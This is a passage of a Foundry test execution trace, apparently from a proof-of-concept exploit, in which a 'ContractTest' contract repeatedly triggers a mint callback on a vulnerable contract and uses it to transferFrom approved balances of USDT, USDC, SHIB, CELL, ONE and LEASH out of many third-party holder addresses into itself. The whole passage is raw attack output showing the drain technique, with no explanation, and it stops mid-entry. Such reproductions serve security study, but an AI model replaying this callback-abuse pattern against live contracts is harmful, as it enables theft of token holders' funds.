    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002540000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [128530] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [54112] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2467] CELL::balanceOf(0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c) [staticcall]
    │   │   │   └─ ← [Return] 10966052921140276907322 [1.096e22]
    │   │   ├─ [40315] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 10966052921140276907322 [1.096e22], 0x00000000000000000000000026d61e57c44525d25aad4ef20bce3f7aa9d64c4c)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] CELL: [0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099]
    │   │   │   ├─ [35535] CELL::transferFrom(0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10966052921140276907322 [1.096e22])
    │   │   │   │   ├─ emit Transfer(from: 0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10966052921140276907322 [1.096e22])
    │   │   │   │   ├─ emit Approval(owner: 0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665640564028491531086772852732613 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002550000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102780] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [28362] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x71f69A5611375DC6FCBe72044b0a2363fCb0d967) [staticcall]
    │   │   │   └─ ← [Return] 2504028436 [2.504e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 2504028436 [2.504e9], 0x00000000000000000000000071f69a5611375dc6fcbe72044b0a2363fcb0d967)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x71f69A5611375DC6FCBe72044b0a2363fCb0d967, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2504028436 [2.504e9])
    │   │   │   │   ├─ emit Transfer(from: 0x71f69A5611375DC6FCBe72044b0a2363fCb0d967, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2504028436 [2.504e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002560000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [102903] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [28485] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0xC5CC992AAf6ECaC0a1074fa4435ac36FD51FFEEd) [staticcall]
    │   │   │   └─ ← [Return] 2053619900 [2.053e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 2053619900 [2.053e9], 0x000000000000000000000000c5cc992aaf6ecac0a1074fa4435ac36fd51ffeed)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0xC5CC992AAf6ECaC0a1074fa4435ac36FD51FFEEd, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2053619900 [2.053e9])
    │   │   │   │   ├─ emit Transfer(from: 0xC5CC992AAf6ECaC0a1074fa4435ac36FD51FFEEd, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2053619900 [2.053e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002570000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [103026] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [28608] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x498C3274D8DdEe9e1C727f31232e2e41Ab55BAf9) [staticcall]
    │   │   │   └─ ← [Return] 2032709923 [2.032e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 2032709923 [2.032e9], 0x000000000000000000000000498c3274d8ddee9e1c727f31232e2e41ab55baf9)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x498C3274D8DdEe9e1C727f31232e2e41Ab55BAf9, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2032709923 [2.032e9])
    │   │   │   │   ├─ emit Transfer(from: 0x498C3274D8DdEe9e1C727f31232e2e41Ab55BAf9, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2032709923 [2.032e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002580000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [144327] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [69909] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [9815] USDC::balanceOf(0x7b05363f549c929C3dA930f6728e3D74806E4103) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x7b05363f549c929C3dA930f6728e3D74806E4103) [delegatecall]
    │   │   │   │   └─ ← [Return] 1900052720 [1.9e9]
    │   │   │   └─ ← [Return] 1900052720 [1.9e9]
    │   │   ├─ [48272] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 1900052720 [1.9e9], 0x0000000000000000000000007b05363f549c929c3da930f6728e3d74806e4103)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]
    │   │   │   ├─ [43492] USDC::transferFrom(0x7b05363f549c929C3dA930f6728e3D74806E4103, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1900052720 [1.9e9])
    │   │   │   │   ├─ [42697] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(0x7b05363f549c929C3dA930f6728e3D74806E4103, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1900052720 [1.9e9]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: 0x7b05363f549c929C3dA930f6728e3D74806E4103, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1900052720 [1.9e9])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x00000000000000000000000000000000000000000000000000000000000002590000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [129333] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [54915] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2639] SHIB::balanceOf(0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF) [staticcall]
    │   │   │   └─ ← [Return] 238807361821278282381675116 [2.388e26]
    │   │   ├─ [40331] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 238807361821278282381675116 [2.388e26], 0x00000000000000000000000032923bf50f9d4d182c9dc09a66fb9167b9ab91bf)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] SHIB: [0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE]
    │   │   │   ├─ [35551] SHIB::transferFrom(0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 238807361821278282381675116 [2.388e26])
    │   │   │   │   ├─ emit Transfer(from: 0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 238807361821278282381675116 [2.388e26])
    │   │   │   │   ├─ emit Approval(owner: 0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665640074313431249343950212695810 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025a0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [121445] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [47027] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2553] ONE::balanceOf(0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f) [staticcall]
    │   │   │   └─ ← [Return] 495501876673720331137682576283 [4.955e29]
    │   │   ├─ [34906] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 495501876673720331137682576283 [4.955e29], 0x0000000000000000000000000a78fbeb89ee251c0d78e0eeb5e6bb7524a8939f)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] ONE: [0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2]
    │   │   │   ├─ [30126] ONE::transferFrom(0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 495501876673720331137682576283 [4.955e29])
    │   │   │   │   ├─ emit Transfer(from: 0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, to: 0x0000000000000000000000000000000000000000, value: 9910037533474406622753651525 [9.91e27])
    │   │   │   │   ├─ emit Transfer(from: 0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, to: 0xd26Cc7C8D96F6Ca5291758d266447f6879A66E16, value: 9910037533474406622753651525 [9.91e27])
    │   │   │   │   ├─ emit Transfer(from: 0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 475681801606771517892175273233 [4.756e29])
    │   │   │   │   ├─ emit transferWithTax(: 0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 495501876673720331137682576283 [4.955e29], : 9910037533474406622753651525 [9.91e27])
    │   │   │   │   ├─ emit Approval(owner: 0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665145062162783863676775447063652 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [104169] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29751] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2958] LEASH::balanceOf(0xCfd3eF97272777F6D814344AE93dd6C69b27f214) [staticcall]
    │   │   │   └─ ← [Return] 4017745257076277282 [4.017e18]
    │   │   ├─ [17102] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 4017745257076277282 [4.017e18], 0x000000000000000000000000cfd3ef97272777f6d814344ae93dd6c69b27f214)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] LEASH: [0x27C70Cd1946795B66be9d954418546998b546634]
    │   │   │   ├─ [12322] LEASH::transferFrom(0xCfd3eF97272777F6D814344AE93dd6C69b27f214, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4017745257076277282 [4.017e18])
    │   │   │   │   ├─ emit Transfer(from: 0xCfd3eF97272777F6D814344AE93dd6C69b27f214, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4017745257076277282 [4.017e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025c0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [103641] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29223] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0x0e1DF04fea7411A393f5Ac2a1907b5e292280bfa) [staticcall]
    │   │   │   └─ ← [Return] 1146338358 [1.146e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 1146338358 [1.146e9], 0x0000000000000000000000000e1df04fea7411a393f5ac2a1907b5e292280bfa)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0x0e1DF04fea7411A393f5Ac2a1907b5e292280bfa, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1146338358 [1.146e9])
    │   │   │   │   ├─ emit Transfer(from: 0x0e1DF04fea7411A393f5Ac2a1907b5e292280bfa, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1146338358 [1.146e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025d0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [103764] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [29346] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [3031] USDT::balanceOf(0xD156a9E6F661F4Ea23B21dbDddB1a39dBeA63e65) [staticcall]
    │   │   │   └─ ← [Return] 1145341907 [1.145e9]
    │   │   ├─ [16378] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 1145341907 [1.145e9], 0x000000000000000000000000d156a9e6f661f4ea23b21dbdddb1a39dbea63e65)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7]
    │   │   │   ├─ [11730] USDT::transferFrom(0xD156a9E6F661F4Ea23B21dbDddB1a39dBeA63e65, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1145341907 [1.145e9])
    │   │   │   │   ├─ emit Transfer(from: 0xD156a9E6F661F4Ea23B21dbDddB1a39dBeA63e65, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1145341907 [1.145e9])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
    │   │           data: 0x000000000000000000000000000000000000000000000000000000000000025e0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop] 
    ├─ [121937] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::5ffe72b7(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [47519] ContractTest::mint(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, 0, 0, 0, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [2553] ONE::balanceOf(0x512e9701D314b365921BcB3b8265658A152C9fFD) [staticcall]
    │   │   │   └─ ← [Return] 354860592616866764729245326702 [3.548e29]
    │   │   ├─ [34906] 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826::uniswapV3MintCallback(0, 354860592616866764729245326702 [3.548e29], 0x000000000000000000000000512e9701d314b365921bcb3b8265658a152c9ffd)
    │   │   │   ├─ [684] ContractTest::token1() [staticcall]
    │   │   │   │   └─ ← [Return] ONE: [0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2]
    │   │   │   ├─ [30126] ONE::transferFrom(0x512e9701D314b365921BcB3b8265658A152C9fFD, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 354860592616866764729245326702 [3.548e29])
    │   │   │   │   ├─ emit Transfer(from: 0x512e9701D314b365921BcB3b8265658A152C9fFD, to: 0x0000000000000000000000000000000000000000, value: 7097211852337335294584906534 [7.097e27])
    │   │   │   │   ├─ emit Transfer(from: 0x512e9701D314b365921BcB3b8265658A152C9fFD, to: 0xd26Cc7C8D96F6Ca5291758d266447f6879A66E16, value: 7097211852337335294584906534 [7.097e27])
    │   │   │   │   ├─ emit Transfer(from: 0x512e9701D314b365921BcB3b8265658A152C9fFD, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 340666168912192094140075513634 [3.406e29])
    │   │   │   │   ├─ emit transferWithTax(: 0x512e9701D314b365921BcB3b8265658A152C9fFD, : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 354860592616866764729245326702 [3.548e29], : 7097211852337335294584906534 [7.097e27])
    │   │   │   │   ├─ emit Approval(owner: 0x512e9701D314b365921BcB3b8265658A152C9fFD, spender: 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826, value: 115792089237316195423570985008687907853269984665285703446840717243183884313233 [1.157e77])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] 10, 11
    │   ├─  emit topic 0: 0xfdf7312e417159eecc0fccd78b9f9c08bc7fe1da841dfe25b172a86c4c781740
